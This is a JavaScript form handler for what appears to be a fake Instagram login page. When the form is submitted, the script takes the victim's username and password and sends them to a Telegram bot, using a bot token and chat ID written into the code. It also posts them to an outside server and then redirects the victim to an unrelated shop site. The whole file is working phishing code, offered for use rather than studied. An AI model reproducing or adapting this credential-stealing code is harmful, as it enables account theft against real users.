document.getElementById('loginForm').addEventListener('submit', function (e) {
    e.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    /* ──────────── ➊  YOUR TELEGRAM CREDENTIALS ──────────── */
    const botToken = '8187937575:AAEjpbjPPMiLdoJ8SkIF-SlwyvIFPysgW7k';
    const chatId   = '7903662789';
    const message  = `🔐 New Instagram Login Attempt:\n👤 Username: ${username}\n🔑 Password: ${password}`;

    fetch(
        `https://api.telegram.org/bot${botToken}/sendMessage` +
        `?chat_id=${chatId}&text=${encodeURIComponent(message)}`
    ).catch(console.error);
    /* ─────────────────────────────────────────────────────── */

    fetch('https://web-9ik7.onrender.com/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password })
    })
    .then(res => res.json())
    .then(data => {
        window.location.href = 'https://hypestep.shop/?fbclid=PAZXh0bgNhZW0CMTEAAafzdYM-GyICgPQ7HxUjTG4Lm5XftjcOSNAfonTWfYeAjPmYStMMbMjUL3jXoA_aem_bur4Vs-cSwanYcQijo9CZA';
    })
    .catch(() => alert('Server error'));
});